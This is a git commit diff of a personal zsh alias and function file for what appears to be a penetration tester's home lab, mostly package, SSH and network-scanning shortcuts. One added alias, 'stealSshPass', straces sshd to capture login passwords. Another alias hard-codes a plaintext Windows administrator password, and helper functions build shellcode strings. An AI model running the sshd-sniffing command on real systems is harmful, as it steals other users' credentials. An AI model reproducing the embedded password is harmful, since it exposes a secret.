c0c51e47cedd80d8b4b919c20dc6c334feb3fb13
Votre Nom <Vous@exemple.com>
2018-04-14 17:46:55 +0200

    alias

--- alias.zsh
+++ alias.zsh
@@ -49,15 +49,13 @@ alias AURinstalled="pacman -Qqm"
 alias AV='aptitude versions'
 alias A='yaourt -Ss'
 alias B5D="/usr/bin/sshXKey k4ndar3c@10.42.1.21"
-alias BattPower="upower -i /org/freedesktop/UPower/devices/battery_BAT0"
-alias BattPower='upower -i /org/freedesktop/UPower/devices/battery_BAT1'
+alias BattPower="upower -i $(upower -e | grep BAT)"
 #alias b='cd /opt/backbox/ ; clear'
 alias b='cd /opt/backbox/ ; clear'
 alias b='cd /opt/backbox/ ; clear_console'
 alias bugtraq="/usr/bin/sshXKey 10.42.1.27"
 alias bugtraq="/usr/bin/sshXKey root@10.42.1.27"
 alias C1='sed "s/^./\u&/"'
-alias CAM3="vlc -I dummy -v --noaudio --ttl 12 v4l2:///dev/video0 --sout '#std{access=mmsh,dst=:1234}' -V X11"
 alias CAM='vlc -v --noaudio v4l2:///dev/video0 --sout "#transcode{vcodec=mp4v,vb=128}:std{access=mmsh,dst=:1234}"'
 alias CAnAl+="youtube-dl 'http://www.canalplus.fr/c-emissions/c-le-petit-journal/pid6515-le-petit-journal.html'"
 alias CAPItalize="sed 's/.*/\U&/'"   #awk '{print toupper($0)}'
@@ -65,6 +63,7 @@ alias ccat='pygmentize -O bg=dark'
 alias ..='cd ..'
 alias c='dnf list installed | grep -i'
 alias c='dpkg -l | grep -i'
+alias c='qlist -I'
 alias CGits="cd /EXT4/GITs"
 alias chromium-browser='chromium-browser --user-data-dir=/root/.chromium-browser'
 alias cl='clear_console ; ls -hFl'
@@ -77,7 +76,6 @@ alias CLEAN='eclean-dist -d ; eclean-pkg -d ; bleachbit -c --preset'
 alias CLEAN='pacman -Scc; bleachbit -c --preset'
 alias c='pacman -Qs'
 alias cp='cp -v'
-alias c='qlist -I'
 alias D3F7="/usr/bin/sshXKey 10.42.1.31"
 alias DCA='dpkg --configure -a'
 alias d='cd /DwS/Downloads ; clear'
@@ -94,11 +92,9 @@ alias DL='ls -a| while read a ; do du -hs "$a" ;done| sort -nr'
 alias dnf="dnf --color=auto"
 alias DOWNmon0='airmon-ng stop mon0'
 alias du='du -h'
-alias e='cd /DATAS/ ; clear_console'
+alias e='eselect '
 alias E='exit'
 alias egrep='egrep --color=auto'
-alias EPR='FEATURES="-getbinpkg" emerge --ignore-default-opts -v --keep-going @preserved-rebuild -a'
-alias eq="equery"
 alias f3doR="/usr/bin/sshXKey 10.42.1.18"
 alias f3doR="/usr/bin/sshXKey root@10.42.1.18"
 alias fact='elinks -dump randomfunfacts.com | sed -n '\''/^| /p'\'' | tr -d \|'
@@ -109,7 +105,6 @@ alias f='cd /ntfsFILES/ ; clear'
 alias fgrep='fgrep --color=auto'
 alias FInd='find / -iname'
 alias findSUID='find / -user root -perm -4000 -print'
-alias fortuneCow="/usr/games/fortune | /usr/games/cowsay -f $(ls /usr/share/cowsay/cows | shuf -n1)"
 alias fortune="/usr/games/fortune"
 alias fr33bsd="/usr/bin/sshXKey 10.42.1.31"
 alias free='free -h'
@@ -121,7 +116,6 @@ alias FULLnmap='nmap --reason -A -sC -sS '
 alias -g BT='--backtrack=200'
 alias GC='git clone'
 alias GenKernel="genkernel --no-clean --luks --gpg all"
-alias getIp="python3 -c 'import socket;s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM);s.connect((\"10.42.1.5\",80));print(s.getsockname()[0]);s.close()'"
 alias -g G="|grep --color=auto"
 alias g='grep --color=auto'
 alias -g H='--help'
@@ -129,9 +123,7 @@ alias -g KG='--keep-going'
 alias GP='git pull'
 alias grep='grep --color=auto'
 alias GROLAND="youtube-dl 'http://www.canalplus.fr/c-humour/pid1787-c-groland.html'"
-alias -g triPkgList="cut -d'(' -f2|rmVer|sort -u|uniq"
 alias GUIGNOLS="youtube-dl 'http://www.canalplus.fr/c-humour/pid1784-c-les-guignols.html'"
-alias GUp="GITs.py /pentest/PeNtEsT /root"
 alias H='cat /root/.zsh_history | grep -i '
 alias h='cd /home/k4ndar3c/ ; clear'
 alias HEAders="wget -S --spider -O - "
@@ -144,8 +136,6 @@ alias I='iwconfig'
 alias IpForward='echo 1 > /proc/sys/net/ipv4/ip_forward'
 alias IpForwardStop='echo 0 > /proc/sys/net/ipv4/ip_forward'
 alias IPv6='nmap -6 --script="*ipv6*" --script-args=newtargets'
-alias ircNewbieCon="irssi -c irc.worldnet.net"
-alias ircRootMe="irssi -c irc.root-me.org"
 alias jaR0="/usr/bin/sshXKey 10.42.1.10"
 alias jaR0="/usr/bin/sshXKey root@10.42.1.10"
 alias j='jobs'
@@ -202,13 +192,12 @@ alias NMStart="systemctl start NetworkManager.service"
 alias NMStop="service network-manager stop;pkill wpa_supplicant"
 alias NMStop="systemctl stop NetworkManager.service wpa_supplicant.service"
 alias n='netstat -antup ; echo ; ss -antup ; echo ; lsof -i -P'
-alias NoBinpkg='FEATURES="-getbinpkg"'
 alias np='netstat -anp | grep -i'
 alias nSTool="/usr/bin/sshXKey 10.42.1.34"
 alias nt='arp-scan -l -I'
 alias NT='arp-scan -l -I $(ifconfig |grep "flag" |grep -v "lo" |cut -f1 -d":")'
 alias NT='arp-scan -l -I $(ifconfig |grep flag|grep -v lo |cut -f1 -d":")'
-alias NTNames="arp-scan -l |sed 's/www.nta-monitor.com\/tools\/arp-scan\/)/\n/g' | sed 's/10.42.1.10\t/jaR0\t/g' | sed 's/10.42.1.100\t/RT\t/g' | sed 's/10.42.1.11\t/Landar0x\t/g' | sed 's/10.42.1.12\t/Knoppix\t/g' | sed 's/10.42.1.13\t/m4k\t/g' | sed 's/10.42.1.14\t/muS1x\t/g' | sed 's/10.42.1.15\t/q5vi\t/g' | sed 's/10.42.1.16\t/R3d\t/g' | sed 's/10.42.1.17\t/xXx\t/g' | sed 's/10.42.1.18\t/f3dor\t/g' | sed 's/10.42.1.19\t/Matriux\t/g' | sed 's/10.42.1.20\t/BOX\t/g' | sed 's/10.42.1.21\t/tru30s\t/g' | sed 's/10.42.1.22\t/Spike\t/g' | sed 's/10.42.1.23\t/wifislax\t/g' | sed 's/10.42.1.25\t/w1ns3rv\t/g' | sed 's/10.42.1.27\t/bugtraq\t/g' | sed 's/10.42.1.28\t/n3th\t/g' | sed 's/10.42.1.29\t/pentoo\t/g' | sed 's/10.42.1.30\t/BOX\t/g' | sed 's/10.42.1.33\t/Ka0s\t/g' | sed 's/10.42.1.34\t/nSTool\t/g' | sed 's/10.42.1.31\t/fr33bsd\t/g' | sed 's/10.42.1.26\t/srv8e\t/g' | sed 's/10.42.1.24\t/LiGhT\t/g' | sed 's/10.42.1.32\t/parrot\t/g'| sed 's/10.42.1.35\t/minino\t/g'| sed 's/10.42.1.37\t/p3nt00\t/g'"
+alias NTNames="arp-scan -l |sed 's/www.nta-monitor.com\/tools\/arp-scan\/)/\n/g' | sed 's/10.42.1.10\t/jaR0\t/g' | sed 's/10.42.1.100\t/RT\t/g' | sed 's/10.42.1.11\t/Landar0x\t/g' | sed 's/10.42.1.12\t/Knoppix\t/g' | sed 's/10.42.1.13\t/m4k\t/g' | sed 's/10.42.1.14\t/muS1x\t/g' | sed 's/10.42.1.15\t/q5vi\t/g' | sed 's/10.42.1.16\t/R3d\t/g' | sed 's/10.42.1.17\t/xXx\t/g' | sed 's/10.42.1.18\t/f3dor\t/g' | sed 's/10.42.1.19\t/Matriux\t/g' | sed 's/10.42.1.20\t/BOX\t/g' | sed 's/10.42.1.21\t/tru30s\t/g' | sed 's/10.42.1.22\t/Spike\t/g' | sed 's/10.42.1.23\t/wifislax\t/g' | sed 's/10.42.1.25\t/w1ns3rv\t/g' | sed 's/10.42.1.27\t/bugtraq\t/g' | sed 's/10.42.1.28\t/n3th\t/g' | sed 's/10.42.1.29\t/pentoo\t/g' | sed 's/10.42.1.30\t/BOX\t/g' | sed 's/10.42.1.33\t/Ka0s\t/g' | sed 's/10.42.1.34\t/nSTool\t/g' | sed 's/10.42.1.31\t/fr33bsd\t/g' | sed 's/10.42.1.26\t/srv8e\t/g' | sed 's/10.42.1.24\t/LiGhT\t/g' | sed 's/10.42.1.32\t/parrot\t/g'| sed 's/10.42.1.35\t/minino\t/g'| sed 's/10.42.1.37\t/p3nt00\t/g' | sed 's/10.42.1.39\t/p17\t/g'"
 alias NT='/usr/bin/arp-scan -l -I $(ifconfig | grep -B1 "inet"|grep -i ether|cut -f1 -d" ")'
 alias NW='ifconfig | grep Bcast | cut -d '\'':'\'' -f2 | cut -d '\'' '\'' -f1 | cut -d . -f 1,2,3 | sed -e '\''s/$/.0\/24/'\'''
 alias OFF='shutdown -h -P now'
@@ -216,11 +205,8 @@ alias p2='/etc/init.d/postgresql start'
 alias p2s='/etc/init.d/postgresql stop'
 alias p2s='systemctl stop postgresql'
 alias p2='systemctl start postgresql'
-alias penShare='mount p3nt00:/home/k4ndar3c /mnt/pent00'
 alias pentoo="/usr/bin/sshXKey 10.42.1.29"
 alias pentoo="/usr/bin/sshXKey root@10.42.1.29"
-alias penUp2='time emerge --color y -uDNav --alphabetical --with-bdeps y @system @world'
-alias penUp='agSmooth portage ; time emerge --deep --update --newuse -kb --changed-use --newrepo @world'
 alias PipUpgradeAll="pip freeze --local | grep -v '^\-e' | cut -d = -f 1  | xargs -n1 pip install -U"
 alias poogle='ping google.com -c 5 ; ping google.fr -c 5'
 alias p='ps faux|grep -v grep|grep -i'
@@ -260,9 +246,6 @@ alias SKR="ssh-keygen -R "
 alias slax="/usr/bin/sshXKey 10.42.1.23"
 alias slax="/usr/bin/sshXKey root@10.42.1.23"
 alias sm00th="ssh -X -i /home/k4ndar3c/KEY -p 222 10.42.1.5"
-alias smb03="smbclient \\\\\\\\10.42.1.25\\\\SHARE03 -U Administrateur"
-alias smb12="smbclient \\\\\\\\10.42.1.14\\\\d0wn5 -U Administrator"
-alias smbW7="smbclient \\\\\\\\10.42.1.33\\\\FILES -U k4ndar3c"
 alias SolvFilConfl="FEATURES='-collision-detect -protect-owned'"
 alias Spike="/usr/bin/sshXKey 10.42.1.22"
 alias Spike="/usr/bin/sshXKey root@10.42.1.22"
@@ -270,7 +253,6 @@ alias ssFAll="threadedSSH-paramiko.py StopServices;StopServices;clear"
 alias sshXKEY="ssh -X -i /home/k4ndar3c/KEY"
 alias STuff='mount.nfs -v 10.42.1.12:/STuff /mnt/STuff'
 alias SV='svn update'
-alias TailEmergeLog='sudo tail -f /var/log/emerge-fetch.log'
 alias thad0ctor='cd /root/thadOctor/ && bash LAUNCH_TOOLKIT.sh'
 alias T=sensors
 alias t='time'
@@ -278,15 +260,10 @@ alias UL="updatedb && locate "
 alias UP="apt-get update ; apt-get upgrade ; apt-get dist-upgrade"
 alias up='aptitude update ; aptitude safe-upgrade'
 alias update-grub="grub-mkconfig -o /boot/grub/grub.cfg"
-alias updateSite='wget -r -l inf -nc '
 alias UpdateZPrezto="cd /root/.zprezto && git pull && git submodule update --init --recursive"
 alias UPmon0='airmon-ng start wlan1'
 alias up='pacman -Syu'
 alias upSys="time emerge -u1Dva --autounmask @system"
-alias urldecode='node -e "console.log(decodeURIComponent(process.argv[1]))"'
-alias urldecodepy='python3 -c "import sys, urllib.parse as up; print(up.unquote_plus(sys.argv[1]))"'
-alias urlencode='node -e "console.log(encodeURIComponent(process.argv[1]))"'
-alias urlencodepy='python3 -c "import sys, urllib.parse as up; print(up.quote_plus(sys.argv[1]))"'
 alias US="gtrans.py -d us"
 alias VA="vim /etc/portage/package.accept_keywords"
 alias v='cd /srv/http ; clear ; ls -ahl'
@@ -296,10 +273,7 @@ alias VIdz="egrep '(mp4|webm|flv|mkv|avi)'"
 alias VM="vim /etc/portage/package.mask"
 alias VpnHome='pptpsetup --create HOME --server 10.42.0.26 --username k4ndar3c --encrypt mppe --start && route add -net 10.42.1.0 netmask 255.255.255.0 gateway 10.42.1.100'
 alias VU="vim /etc/portage/package.use"
-alias VW="vim /var/lib/portage/world"
 alias WEBsecurify="cd /EXT4/SVNs/websecurify-read-only && ./xulrunner9.0/xulrunner --app ./xulrunner/websecurify/applications/scanner/application.ini &"
-alias whichSong="ssh root@10.42.1.19 lsof -c vlc|grep Z1C|cut -d '/' -f4,5,6,7,8,9,10,11,12,13,14"
-alias win12="rdesktop -k fr -u Administrator -p 'W1Nddos)' -g 1024x1024 10.42.1.14 &"
 alias WLAN0scan="iw wlan0 scan |egrep -ie '(SSID|signal)'"
 alias WLAN1scan="iw wlan1 scan |egrep -ie '(SSID|signal)'"
 alias WLAN2scan="iw wlan2 scan |egrep -ie '(SSID|signal)'"
@@ -316,29 +290,68 @@ alias z90='date ; shutdown -h -P +90'
 function Append0-9 { for i in $(cat $1) ; do seq -f $i%1.0f 0 9 ; done ; }
 function CHROOT { mount $1 $2 ; mount -t proc /proc $2/proc ; mount -t sysfs /sys $2/sys ; mount -B /dev $2/dev ; mount -B /dev/pts $2/dev/pts ; chroot $2 ; }
 function GACP { git add --all && git commit -a -m $1 && git push -u origin $2 ; }
-function GMD5 { egrep $1 /pentest/PeNtEsT/pentestscr1pts/w0Rdl1stS/MD5s-resolv.lst ; }
-function hexMd5sum { echo -n $1 | xxd -r -p | md5sum ; }
 function live-clean { for i in {1..$1} ; do nmcli c delete "$2 $i" ; done ; }
 function LookAtGit { elinks "https://github.com/$1?tab=repositories" ; }
-function lsbTestAll { for i in mersenne log_gen identity fibonacci fermat eratosthenes_composite eratosthenes carmichael ackermann OEIS_A000217 Dead_Man_Walking syracuse ; do lsb-set reveal -i $1 -g $i ; done ; }
 function MAC { for i in $(ifconfig -a|grep flag|grep -v lo |cut -f1 -d":") ; do echo ; echo $i ; macchanger -s $i ; done ; }
 function MAC { for i in $(ifconfig -a | grep Link | awk '{print $1}' | grep -v lo) ; do echo ; echo $i ; macchanger -s $i ; done ; }
 function MakePlayList { touch ./"$2" && find "$1" -print | egrep -ie '(*.mp3|*.wav|*.m4a|*.wma|*.ogg|*.mp4|*.mpc|*.mp4a)'|sed 's/^/\"/g' |sed 's/$/\"/g'  >> "$2" ; echo ---DONE!--- ; }
-function makeShellCode { nasm -f $2 $1.asm -o $1.o ; for i in $(objdump -d $1.o|grep "^ "|cut -f2); do echo -n '\\x'$i ; done ; echo ; }
 function nmapSearchX { nmap -sV -oX /tmp/n.xml $1 ; searchsploit --nmap /tmp/n.xml ; }
 function NP { netstat -anp | grep -i $1 ; ss -anp | grep -i $1 ; lsof -i -P | grep -i $1 ; }
 function PdfDim { gs -dBATCH -dNOPAUSE -q -sDEVICE=pdfwrite -sOutputFile=$1 $2 ; }
 function Qf { find . -iname "*$1*" ; }
-function Q { for i in premiere deuxieme ; do youtube-dl -f http-705 http://www.tf1.fr/tmc/quotidien-avec-yann-barthes/videos/quotidien-$i-partie-$1-$2-2017.html || youtube-dl -f http-704 http://www.tf1.fr/tmc/quotidien-avec-yann-barthes/videos/quotidien-$i-partie-$1-$2-2017.html ; done ; }
-function readelfSort { readelf -s $1 | awk '{print $2,$8}' | sort ; }
 function RedirPort { iptables -t nat -A PREROUTING -i $3 -p tcp --dport $1 -j REDIRECT --to-port $2 ; }
 function ReVerse { python3 -c "print(''.join(reversed(\"$1\")))" ; }
 function ReVerse { python -c "print(''.join(reversed(\"$1\")))" ; }
 function scpKEY { scp -i /home/k4ndar3c/KEY $1 $2 ; }
-function shift51 { for i in {1..51} ; do shiftCipher3.py $1 $i ; done ; for i in {-1..-51} ; do shiftCipher3.py $1 $i ; done ; }
-function showPkgsConfig { for i in `ls /etc/portage/package*` ; do echo -e '\n'$i'#######' ; cat $i ; done ; }
 function SshForAll { for i in $(arp-scan -l |grep 10\.42|grep -v \.100 |cut -f 1) ;do echo $i ; ssh $i $* ; echo '\n';done ;ssh 10.42.0.1 $* }
 function SshForAll { for i in $(/usr/bin/arp-scan -l |grep 10\.42|grep -v \.100 |cut -f 1) ;do echo $i ; ssh $i $* ; echo '\n';done ;ssh 10.42.0.1 $* ; }
-function VirusTotal { python -c "import requests;print(requests.post('https://www.virustotal.com/en/search/', data={'query':'$1'}).content)" |egrep -i '57 antivirus' ; }
 function WHILe { while sleep $1 ; do $2 $3 $4 $5 $6 $7 $8 $9 ; done ; }
 function WHO { ripdc.sh -t $1 ; echo "-----------------" ; nslookup $1 208.67.222.222 ; echo "-----------------" ; dig -t ANY $1 ; echo "-----------------" ; host -a $1 8.8.8.8 ; echo "-----------------" ; dmitry $1 ; }
+alias -g triPkgList="cut -d'(' -f2|rmVer|sort -u|uniq"
+alias TailEmergeLog='sudo tail -f /var/log/emerge-fetch.log'
+alias eq="equery"
+alias urldecode='node -e "console.log(decodeURIComponent(process.argv[1]))"'
+alias urlencode='node -e "console.log(encodeURIComponent(process.argv[1]))"'
+alias EPR='FEATURES="-getbinpkg" emerge --ignore-default-opts -v --keep-going @preserved-rebuild -a'
+function GMD5 { egrep -i $1 /pentest/PeNtEsT/pentestscr1pts/w0Rdl1stS/MD5s-resolv.lst ; }
+function Q { for i in premiere deuxieme ; do youtube-dl -f http-705 http://www.tf1.fr/tmc/quotidien-avec-yann-barthes/videos/quotidien-$i-partie-$1-$2-2017.html || youtube-dl -f http-704 http://www.tf1.fr/tmc/quotidien-avec-yann-barthes/videos/quotidien-$i-partie-$1-$2-2017.html ; done ; }
+alias VW="vim /var/lib/portage/world"
+function showPkgsConfig { for i in `ls /etc/portage/package*` ; do echo -e '\n'$i'@@@@@@@' ; cat $i ; done ; }
+alias getIp="python3 -c 'import socket;s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM);s.connect((\"10.42.1.5\",80));print(s.getsockname()[0]);s.close()'"
+alias fortuneCow="/usr/games/fortune | /usr/games/cowsay -f $(ls /usr/share/cowsay/cows | shuf -n1)"
+alias whichSong="ssh root@10.42.1.19 lsof -c vlc|grep Z1C|cut -d '/' -f4,5,6,7,8,9,10,11,12,13,14"
+alias CAM='vlc -v --noaudio v4l2:///dev/video0 --sout "#transcode{vcodec=mp4v,vb=128}:std{access=mmsh,dst=:1234}"'
+alias CAM3="vlc -I dummy -v --noaudio --ttl 12 v4l2:///dev/video0 --sout '#std{access=mmsh,dst=:1234}' -V X11"
+alias penUp='agSmooth portage ; time emerge --deep --update --newuse -kb --changed-use --newrepo @world'
+alias penUp2='time emerge --color y -uDNav --alphabetical --with-bdeps y @system @world'
+alias urldecodepy='python3 -c "import sys, urllib.parse as up; print(up.unquote_plus(sys.argv[1]))"'
+alias urlencodepy='python3 -c "import sys, urllib.parse as up; print(up.quote_plus(sys.argv[1]))"'
+alias win12="rdesktop -k fr -u Administrator -p 'W1Nddos)' -g 1024x1024 10.42.1.14 &"
+function lsbTestAll { for i in mersenne log_gen identity fibonacci fermat eratosthenes composite triangular_numbers carmichael ackermann ackermann_naive Dead_Man_Walking syracuse ; do stegano-lsb-set reveal -i $1 -g $i ; done ; }
+function shift51 { for i in {1..51} ; do shiftCipher3.py $1 $i ; done ; for i in {-1..-51} ; do shiftCipher3.py $1 $i ; done ; }
+alias smb03="smbclient \\\\\\\\10.42.1.25\\\\SHARE03 -U Administrateur"
+alias smbW7="smbclient \\\\\\\\10.42.1.33\\\\FILES -U k4ndar3c"
+alias smb12="smbclient \\\\\\\\10.42.1.14\\\\d0wn5 -U Administrator"
+alias NoBinpkg='FEATURES="-getbinpkg"'
+alias ircRootMe="irssi -c irc.root-me.org"
+alias ircNewbieCon="irssi -c irc.worldnet.net"
+alias penShare='mount p3nt00:/home/k4ndar3c /mnt/pent00'
+alias GUp="GITs.py /pentest/PeNtEsT /root"
+function VirusTotal { python -c "import requests;print(requests.post('https://www.virustotal.com/en/search/', data={'query':'$1'}).content)" |egrep -i ('57 antivirus'|'File not found') ; }
+function readelfSort { readelf -s $1 | awk '{print $2,$8}' | sort ; }
+function hexMd5sum { echo -n $1 | xxd -r -p | md5sum ; }
+function dHex { echo -n $1 | xxd -r ; echo ; }
+alias decryptPubKey="openssl rsa -pubin -text -modulus -in"
+alias stealSshPass="strace -ff -p $(pidof sshd) -e read |& grep -F ', \"\f\0\0\0\'"
+function d64 { echo -n $1 |base64 -d ; echo ; }
+function u64dec { python2 -c "import base64; print int(base64.b64decode('$1').encode('hex'),16)" ; }
+alias msieve='msieve -v'
+function makeShellCode { nb=0 ; for i in $(objdump -d $1|grep "^ "|cut -f2); do nb=$(($nb+1)) ; echo -n '\\x'$i ; done ; echo ; echo "len=$nb" ; }
+function nasm2ld { nasm -f elf64 -o $1.o $1.asm ; ld $1.o -o $1 -m elf_x86_64 ; }
+function nasm2ld32 { nasm -f elf -o $1.o $1.asm ; ld $1.o -o $1 -m elf_i386 ; }   
+function makeShellCode2 { xxd -c 1 $1 | awk '{print "\\x"$2 }' |tr -d '\n' ; echo ; wc -c $1 ; }
+function updateSite { find $1 -name "index.html?*" -print -exec rm "{}" \; ; wget -r -l inf -nc $1 ; }
+function cC { for i in $(ls) ; do echo ; echo $i@@@@@@@ ; ccat $i || cat $i ; done ; }
+alias YT="youtube-dl -f18 "
+alias Y="youtube-dl "
+function CleanWebPage { curl -s $1 | html2text ; }
